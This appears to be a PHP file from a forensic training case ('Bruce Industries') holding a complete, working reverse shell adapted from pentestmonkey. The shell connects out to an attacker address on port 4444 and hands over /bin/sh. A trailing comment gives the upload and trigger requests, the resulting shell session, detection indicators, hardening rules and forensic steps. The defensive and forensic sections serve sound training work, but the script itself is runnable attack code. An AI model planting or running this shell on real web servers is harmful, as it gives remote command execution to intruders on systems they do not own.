<?php
/**
 * PHP Reverse Shell - Educational Example
 * 
 * ⚠️  WARNING: FOR EDUCATIONAL PURPOSES ONLY
 * This script demonstrates the reverse shell technique used in the
 * Bruce Industries simulation. Use ONLY in authorized testing environments.
 * 
 * Unauthorized access to computer systems is ILLEGAL.
 * 
 * Based on: pentestmonkey/php-reverse-shell
 * Modified for educational demonstration purposes
 */

// SIMULATION DETAILS FROM BRUCE INDUSTRIES CASE
// Attacker IP: 10.200.0.129
// Listening Port: 4444
// Uploaded via RFI vulnerability in /employee_pro/upload.php

set_time_limit(0);
$VERSION = "1.0";
$ip = '10.200.0.129';  // ATTACKER IP - Change for your testing
$port = 4444;          // ATTACKER LISTENING PORT
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonize if possible to avoid timeout issues
//
if ($daemon) {
    $pid = pcntl_fork();
    if ($pid == -1) {
        printit("ERROR: Can't fork");
        exit(1);
    }
    if ($pid) {
        exit(0);  // Parent exits
    }
    // Make current process the session leader
    if (posix_setsid() == -1) {
        printit("Error: Can't setsid()");
        exit(1);
    }
    $daemon = 0;
}

// Change to root directory
@chdir("/");

// Clear file creation mask
@umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    printit("ERROR: $errno - $errstr");
    exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin
   1 => array("pipe", "w"),  // stdout
   2 => array("pipe", "w")   // stderr
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
}

// Set everything to non-blocking
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
    if (feof($sock)) {
        printit("ERROR: Shell connection terminated");
        break;
    }

    if (feof($pipes[1])) {
        printit("ERROR: Shell process terminated");
        break;
    }

    // Check for end of STDERR
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    // If we can read from the network
    if (in_array($sock, $read_a)) {
        if ($debug) printit("SOCK READ");
        $input = fread($sock, $chunk_size);
        if ($debug) printit("SOCK: $input");
        fwrite($pipes[0], $input);
    }

    // If we can read from the shell's STDOUT
    if (in_array($pipes[1], $read_a)) {
        if ($debug) printit("STDOUT READ");
        $input = fread($pipes[1], $chunk_size);
        if ($debug) printit("STDOUT: $input");
        fwrite($sock, $input);
    }

    // If we can read from the shell's STDERR
    if (in_array($pipes[2], $read_a)) {
        if ($debug) printit("STDERR READ");
        $input = fread($pipes[2], $chunk_size);
        if ($debug) printit("STDERR: $input");
        fwrite($sock, $input);
    }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Helper function for debugging
function printit($string) {
    if (!$daemon) {
        print "$string\n";
    }
}

?>

<!-- 
=============================================================================
EXPLOITATION TIMELINE (FROM WIRESHARK ANALYSIS)
=============================================================================

[Packet #203] RFI Upload Request
POST /employee_pro/upload.php HTTP/1.1
Host: 10.200.0.91
Content-Type: multipart/form-data
Content-Length: 888

File uploaded: php-reverse-shell.php
Result: "The file php-reverse-shell.php has been uploaded."

[Packet #206] Reverse Shell Triggered
GET /employee_pro/php-reverse-shell.php HTTP/1.1
Host: 10.200.0.91

Result: Shell spawned as www-data user

[Connection Established]
Source: 10.200.0.91:49712
Destination: 10.200.0.129:4444
Protocol: TCP
Status: ESTABLISHED

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ uname -a
Linux victim 5.4.0-42-generic #46-Ubuntu x86_64 GNU/Linux

$ whoami
www-data

=============================================================================
DETECTION INDICATORS
=============================================================================

File Indicators:
- Filename: php-reverse-shell.php (suspicious naming)
- Location: /var/www/html/employee_pro/
- Permissions: 644 (world-readable)
- Owner: www-data
- File signature: PHP web shell pattern

Network Indicators:
- Outbound connection to 10.200.0.129:4444
- Long-lived TCP connection from web server
- Unusual process: apache2 spawning /bin/sh
- High volume of data transfer from web directory

System Indicators:
- Apache access logs: GET /employee_pro/php-reverse-shell.php
- Process tree: apache2 -> php -> sh
- Network connections: ESTABLISHED to external IP on non-standard port

Log Entries:
/var/log/apache2/access.log:
10.200.0.129 - - [15/Apr/2025:14:24:52] "GET /employee_pro/php-reverse-shell.php HTTP/1.1" 200 0

/var/log/auth.log:
[No authentication - shell spawned as www-data directly]

=============================================================================
DEFENSE & PREVENTION
=============================================================================

1. FILE UPLOAD RESTRICTIONS
   - Validate file extensions (whitelist only: .jpg, .png, .pdf)
   - Check MIME type (don't trust client-provided type)
   - Rename uploaded files (remove original extension)
   - Store uploads outside web root
   - Disable script execution in upload directory
   
   Apache .htaccess in upload directory:
   <FilesMatch "\.(php|php3|php4|php5|phtml)$">
       Order Deny,Allow
       Deny from all
   </FilesMatch>
   php_flag engine off

2. WEB APPLICATION FIREWALL (WAF)
   ModSecurity rules:
   SecRule FILES_NAMES "@rx \.php$" \
       "id:1002,\
       phase:2,\
       deny,\
       status:403,\
       msg:'PHP file upload blocked'"

3. NETWORK MONITORING
   Monitor for:
   - Outbound connections from web server to unusual ports
   - Long-lived connections from Apache/Nginx processes
   - Connections to internal IPs from DMZ systems
   
   Snort/Suricata rule:
   alert tcp any any -> any !80 (msg:"Web server outbound connection"; \
       flow:to_server,established; \
       sid:1000004;)

4. SYSTEM HARDENING
   - Run web server with minimal privileges
   - Use SELinux/AppArmor to restrict Apache
   - Implement application sandboxing
   - Disable dangerous PHP functions:
   
   php.ini:
   disable_functions = exec,passthru,shell_exec,system,proc_open,popen,pcntl_exec

5. INCIDENT RESPONSE
   If reverse shell detected:
   - Immediately isolate the affected system
   - Kill the malicious process
   - Remove the shell file
   - Review all files in web directory
   - Check for persistence mechanisms
   - Analyze logs for initial intrusion vector
   - Reset all credentials
   - Patch the vulnerability

=============================================================================
FORENSIC ANALYSIS NOTES
=============================================================================

Evidence Collection:
1. Acquire memory dump (capture running processes)
2. Preserve network connections (netstat output)
3. Collect Apache access/error logs
4. Image web server disk
5. Capture network traffic (PCAP)

Timeline Reconstruction:
1. File upload (POST to upload.php)
2. Shell file written to disk
3. Shell triggered (GET request)
4. Network connection established
5. Commands executed via shell
6. Data reconnaissance
7. Privilege escalation attempts

Key Forensic Artifacts:
- /var/log/apache2/access.log (HTTP requests)
- /var/www/html/employee_pro/ (uploaded files)
- /proc/[PID]/cmdline (process command line)
- /proc/net/tcp (network connections)
- Wireshark PCAP files (complete network activity)

=============================================================================
LEGAL NOTICE
=============================================================================

This script is provided for EDUCATIONAL PURPOSES ONLY as part of the
Bruce Industries forensic simulation case study.

ONLY use this in:
✓ Your own systems and lab environments
✓ Authorized penetration testing engagements
✓ Capture The Flag (CTF) competitions
✓ Educational security training with proper authorization

NEVER use this for:
✗ Unauthorized access to systems
✗ Real-world attacks without explicit written permission
✗ Any illegal activity

Unauthorized access to computer systems violates:
- Computer Fraud and Abuse Act (CFAA) - 18 U.S.C. § 1030
- State computer crime laws
- International cybercrime treaties

Always obtain proper authorization before security testing.

=============================================================================
REFERENCES
=============================================================================

- OWASP: https://owasp.org/www-community/attacks/Code_Injection
- MITRE ATT&CK T1059.004: Command and Scripting Interpreter: Unix Shell
- MITRE ATT&CK T1105: Ingress Tool Transfer
- CWE-94: Improper Control of Generation of Code ('Code Injection')
- pentestmonkey PHP reverse shell: http://pentestmonkey.net/tools/web-shells/php-reverse-shell

=============================================================================
-->
